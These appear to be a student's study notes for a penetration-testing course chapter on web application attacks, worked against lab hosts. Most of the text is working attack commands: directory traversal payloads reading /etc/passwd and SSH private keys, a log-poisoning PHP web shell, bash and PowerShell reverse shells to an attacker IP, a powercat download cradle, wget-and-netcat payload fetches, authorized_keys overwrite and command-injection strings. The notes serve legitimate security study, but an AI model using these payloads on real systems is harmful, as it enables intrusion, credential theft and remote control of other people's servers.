# 9. Common Web Application Attacks
no notes

## 9.1. Directory Traversal

### 9.1.1. Absolute vs Relative Paths
Directory Traversal can be done using either Absolute OR Relative paths depending on the vulnerability

### 9.1.2. Identifying and Exploiting Directory Traversals

Linux webroot is often times /var/www/html/

PHP uses $_GET2 to manage variables via a GET request

Directory traversal vulnerabilities are mostly used for gathering information. As mentioned before, if we can access certain files containing sensitive information, like passwords or keys, it may lead to system access.

SSH keys are usually located in the home directory of a user in the .ssh folder -- example of directory traversal to get SSH keys
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

Avoid using browser to read information. use burp or curl, like so
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

Save SSH key into filecalled dt_key, adjust permissions (failing to change permissions will cause unprotected keyfile error)
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.com

Windows /etc/hosts is C:\Windows\System32\drivers\etc\hosts (we use this file because its readable by all local users)

Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd, check for private keys in their home directory, and use them to access the system via SSH
In Windows there is really no way to do this...

Windows IIS webserver logs are at C:\inetpub\logs\LogFiles\W3SVC1\

For windows targets try both forward and backslashes...

Lab Notes
If you do not chmod the ssh key not only will it fail, but it will also ask for password

### 9.1.3. Encoding Special Characters

curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

url encode (aka percent encode) curl for ../ traversal attack
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
NOTE: 2e hexidecimal is 46. 46 in ascii is a DOT or period ".". no need to encode slashes as those are naturally part of URLS

Lab notes: Q1 had us look for the flag in /opt/passwords... is the /opt folder supposed to be something we check? Is there a way that we can automate directory traversal to locate low hanging fruit?
This reddit has a couple of good answers on some files to check.. one mentioned loading Seclists/fuzzing/LFI into burp intruder as a way to automate -- https://www.reddit.com/r/oscp/comments/1ae050m/path_traversal/

WORKING PAYLOAD -- NOTE: REPLACING curl from any payloads that failed with the word FAILED so that they do not populate in a search!
curl --path-as-is http://192.168.162.16:3000/public/plugins/alertlist/../../../../../../../../etc/passwd

CASE: only encoding the dots in between /'s -- passed
curl --path-as-is http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

CASE: Everything is encoded -- failed
failed %68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%36%32%2e%31%36%3a%33%30%30%30%2f%70%75%62%6c%69%63%2f%70%6c%75%67%69%6e%73%2f%61%6c%65%72%74%6c%69%73%74%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

CASE: everything between alertlist/ and /etc/passwd is encoded -- pass
curl http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

CASE: Slash after alertlist is encoded -- fail
failed http://192.168.162.16:3000/public/plugins/alertlist%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

CASE: slash in /etc/passwords are replaced -- pass
curl http://192.168.162.16:3000/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd

CASE: encoding the word public in the uri -- pass
curl http://192.168.162.16:3000/%70%75%62%6c%69%63/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd

CASE: Encoding the slashes in front and behind plugins -- fail
failed http://192.168.162.16:3000/%70%75%62%6c%69%63%2fplugins%2falertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fpasswd

Conclusion: I have to be careful which slashes I encode.... I can encode any slashes after the first one in alertslist/ and I can encode any word in between slashes after the hostname:port. 
However encoding slashes in the regular url will break the request.... Is this observation specific to Grafana or with any directory traversal?

Something else I noticed is that non-encoded payloads need the --path-as-is argument. Encoded payloads work the same with or without the argument

## 9.2. File Inclusion Vulnerabilities
no notes

### 9.2.1. Local File Inclusion (LFI)
directory traversal -- obtain the contents of a file outside of the web server's web root -- read files
file inclusion -- include a file in the application's running code. -- execute local or remote files, also display content of non-executable file
Log Poisoning --  modifying data sent to a webapp so that the logs have executable code

Apache Access.log File Inclusion
access.log is in /var/log/apache2/

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
They noticed that the log has an entry of a User Agent which is a user controlled header

User-Agent payload in burp:
<?php echo system($_GET['cmd']); ?>
$_Get -- super global variable which lets you pull the contents of "cmd" from /index.php?page=admin.php&cmd=whoami
echos the results of system(stuff)

GET /meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=ls%20-la 
%20 -- encoding of white space in command
Previously we uploaded <?php echo system($_GET['cmd']); ?> to the log. Doing a directory traversal to that file executes the php code in the file which grabs the cmd parameter.
the cmd parameter has ls -la with the space inbetween url encoded

bash one-liner for reverse shell
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

php uses bourne for shell instead of bash... will need to use the following one-liner instead
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

php bash one-liner with encoding
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

start a netcat listener 
nc -nvlp 4444

XAMPP apache logs are stored at C:\xampp\apache\logs\access.log

We can also do LFI in Pearl, ASP, ASPE, JSP or even Node.js

Lab notes
sometimes sudo -I will give you root if the account has the correct permissions

### 9.2.2. PHP Wrappers
We can use the php://filter wrapper to display the contents of files either with or without encodings like ROT134 or Base64.

curl http://mountaindesserts.com/meteor/index.php?page=admin.php

Use filter to try to get more info
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

They realised that the page looks incomplete (missing body tag), thus they try encoding the output this time

curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

This output some text in base64, you can decode using 
echo "base64nonsense" | base64 -d
-d: decode

This provided mysql creds -- use those creds to either connect to the database or to try to log into a user account via ssh

php filter wrapper can be used to include contents of a file, but data:// can be used for RCE -- an alternative method when we cannot poison a local file with PHP code

php data wrapper example
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

encoded php data wrapper example 
echo -n '<?php echo system($_GET["cmd"]);?>' | base64

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

kind of confusing but basically the php is nesting another page called admin.php within the homepage. We are using php's data wrapper so that instead it just shows data where the data is plain text, and it show the output of system ls

with the filter wrapper, its basically showing the code as it would look like if it was encoded. This stops it from being executed so that we can see it. then we decode it to see what the underlying code is.


### 9.2.3. Remote File Inclusion (RFI)
php applications need allow_url_include enabled for RFI (data:// needs it as well)
RFI let you point at files not on the machine.. eg an attacker's server via http or smb. Can also be pointed at a public file like one at github

RFI is discoverable using the same techniques as LFI or Directory Traversal

Kali has a bunch of php web shells for RFI
/usr/share/webshells/php/

python -m http.server 80
curl "http://mountaindesserts.com/meteor/index.php?page=http://<ATTACKER>/simple-backdoor.php&cmd=ls"
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.228/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"

### 9.3. File Upload Vulnerabilities
3 types of FU vulns
1) We can upload files that are executed by the web app -- then just access using burp or curl
2) We can upload but need to use another vulnerability for it to run -- example in Directory traversal attack, try to upload to a file that already exists such as authorized_keys
3) we can upload a file but need a victim/another personto access the file

### 9.3.1. Using Executable Files

You can bypass php extension filter by using less common php extensions such as .phps or .php7 or by capitalizing letters e.g .pHP instead of .php
If there is a rename feature, you can also upload the file, then rename it after the fact

you can use powershell on kali
pwsh

create variable called Text which has powershell oneliner for reverse shell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

encode oneliner
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

send curl request to simple-backdoor which takes a a command

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20SOMEBASE64PAYLOAD
powershell -enc: allows powershell to parse base64 payloads

### 9.3.2 Using Non-Executable Files
if a file upload is not executable, another vuln like directory traversal much be used

Always try uploading files that already exist! If already exists, use this to brute force contents of web server. If there is an error, there may be info on framework being used (e.g. php or something)

If directory traversal exists, try to over-write files

authorized_keys ssa overwrite
1) generate an authorized_keys file
ssh-keygen
name: fileup
this creates two files. A private key called fileup and a pubic key called fileup.pub
cat fileup.pub > authorized_keys
authorized keys has our public key... so now if we overwrite the targets authorized key we will be able to authenticate with fileup

2) upload to ../../../../../../../root/.ssh/authorized_keys
NOTE: often the root user does not carry SSH access permissions. Good to check though if you do not know any other users

This may be useful to clear out previous connections to a host (or in our case connecting to the same mountaindesserts hostname but with 10 different ips throughout the course)
rm ~/.ssh/known_hosts

3) connect with SSA Key
ssh -p 2222 -i fileup root@mountaindesserts.com

### 9.4.1. OS Command Injection

This never occured to me, but when a file is uploaded to a web app via file upload, it us using the underlying operating system.

The correct way to implement this is to create prepared commands which cannot be changed by user input. This takes a lot of time

Try different commands in case there is a filter. Does the web app give a hint as to what command is being used? In this case it was heavily hinted to use git.

curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
-X: change request to POST type

curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
this is git;ipconfig which executes both commands seperately

Find if command is executed by CMD or Powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

find if command is executed by cmd or powershell, encoded
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

Target is powershell, use Powercat (Powershell ncat) to get shell

Move payload to attacker http server
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80

nc -nvlp 4444

powershell cradle to get powercat from server
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
IEX.... : This part is to download powercat from attackbox
powercat -c: this is to actually run power cat

encoded request
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACK-HTTP-SERVER>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER>%20-p%204444%20-e%20powershell' http://TARGET:PORT/archive

When encoding payloads it looks like they encoded special characters, spaces... really everything except for the words and ('s )'s

I did the following for one of the labs. Using the command injection I first attempted to create a shell using bash and netcat in the webservers /bin however I did not have permission. I did a pwd and noticed that my account name is "stanley".
Since bash, sh, were not working I decided to try the other most obvious file download tool, wget. I spun up an http server and made a 1-liner to wget the payload from the attack http server, and then also to use nc to launch a connection to my box. nothing happened.
After spending 10 minutes playing with various payloads to get it to work, I realized that the server potentially did not have permission to save files to the "/" directory. 

This time I tried saving the payload to the users home folder
git+--version%3Bwget+192.168.45.228%3a80/nc+-P+/home/stanley/nc

This worked and allowed me to run the payload
git+--version%3Bcd+/home/stanley/%3bnc%20-c%20sh%20192.168.45.228%204242

One thing I need to work on is not diving into rabit holes... I found a bunch of articles talking about wergzueg pin traversal, RCE on console, even for the specific version running. Ultimately this ended up being a rabbit hole.
I was reading sourcecode and trying to inject in the cmd arg for console.py, and got a valid file inclusion. but there was no exploit. I actually attempted to exploit the correct vector but gave up before finding the payload.

Concepts to focus on
Simple payloads to verify if a vulnerability exists

Guessing potentially vulnerable back-ends
 eval() or popen(): popen(f'echo "test"') and creating a payload from there

Bash command injection test used in this course
;whoami
"&&whoami
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
Extra Reading   
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
9.4.1. OS Command Injection
https://github.com/offensive-security/exploitdb
https://git-scm.com/docs/git
https://gitforwindows.org/
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd
https://stackoverflow.com/users/4003407/user4003407
https://github.com/besimorhino/powercat

9.3.2 Using Non-Executable Files
https://en.wikipedia.org/wiki/Google_Drive
https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities
https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools
https://en.wikipedia.org/wiki/Ssh-keygen

9.3.1. Using Executable Files
https://en.wikipedia.org/wiki/Content_management_system
https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
https://adsecurity.org/?p=478
https://www.base64encode.org/
https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.convert
https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding.unicode
https://docs.microsoft.com/en-us/dotnet/api/system.text.encoding
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe


9.3. File Upload Vulnerabilities
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
https://owasp.org/www-community/attacks/xss/
https://developer.mozilla.org/en-US/docs/Web/SVG
https://docs.microsoft.com/en-us/openspecs/office_standards/ms-docx/
https://support.microsoft.com/en-us/office/macros-in-office-files-12b036fd-d140-4e74-b45e-16fed1a7e5c6

9.2.3. Remote File Inclusion (RFI)
https://developer.mozilla.org/en-US/docs/Web/HTTP
https://en.wikipedia.org/wiki/Server_Message_Block
https://docs.python.org/3/
https://docs.python.org/3/library/http.server.html

9.2.2. PHP Wrappers
https://www.php.net/manual/en/wrappers.php.php
https://www.php.net/manual/en/wrappers.data.php
https://www.php.net/manual/en/wrappers.php
https://www.php.net/manual/en/function.str-rot13.php
https://en.wikipedia.org/wiki/Base64
https://www.mysql.com/
https://www.php.net/manual/en/filesystem.configuration.php

9.2.1. Local File Inclusion (LFI)
https://owasp.org/www-community/attacks/Log_Injection
https://httpd.apache.org/docs/2.4/logs.html
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent
https://www.php.net/manual/en/function.system.php
https://www.php.net/manual/en/function.echo.php
https://en.wikipedia.org/wiki/Input_Field_Separators
https://www.w3schools.com/tags/ref_urlencode.asp
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
https://en.wikipedia.org/wiki/Bourne_shell
https://www.apachefriends.org/index.html
https://www.perl.org/
https://en.wikipedia.org/wiki/ASP.NET
https://en.wikipedia.org/wiki/Active_Server_Pages
https://en.wikipedia.org/wiki/Jakarta_Server_Pages
https://nodejs.org/en/


9.2. File Inclusion Vulnerabilities
https://en.wikipedia.org/wiki/File_inclusion_vulnerability
https://www.php.net/manual/en/wrappers.php

9.1.3. Encoding Special Characters
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
https://en.wikipedia.org/wiki/Web_application_firewall
https://en.wikipedia.org/wiki/Percent-encoding
https://www.w3schools.com/tags/ref_urlencode.asp


9.1.2. Identifying and Exploiting Directory Traversals
https://en.wikipedia.org/wiki/Directory_traversal_attack
https://www.php.net/manual/en/reserved.variables.get.php
https://portswigger.net/burp
https://curl.se/
	curl, aka libcurl, is used in cars, tvs, routers, printers, phones....
https://en.wikipedia.org/wiki/Internet_Information_Services
	no notes
https://docs.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage
	logs can be stored on another server, either same domain or different domain, and managed remotely.
https://www.ietf.org/rfc/rfc1738.txt
	describes the syntax and semantics for a compact string representation for a resource available via the Internet.  These strings are called "Uniform Resource Locators" (URLs).
	
